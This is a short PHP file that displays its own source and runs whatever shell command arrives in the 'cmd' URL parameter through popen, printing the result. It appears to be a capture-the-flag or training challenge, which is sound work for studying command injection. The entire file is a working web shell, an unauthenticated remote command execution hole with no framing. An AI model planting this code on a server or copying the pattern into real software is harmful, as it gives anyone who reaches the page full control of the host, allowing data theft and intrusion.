<?php
highlight_file(__FILE__);
$cmd = $_GET["cmd"];
$ben = popen($cmd,'r');
while($s=fgets($ben)){
    print_r($s);
}
?>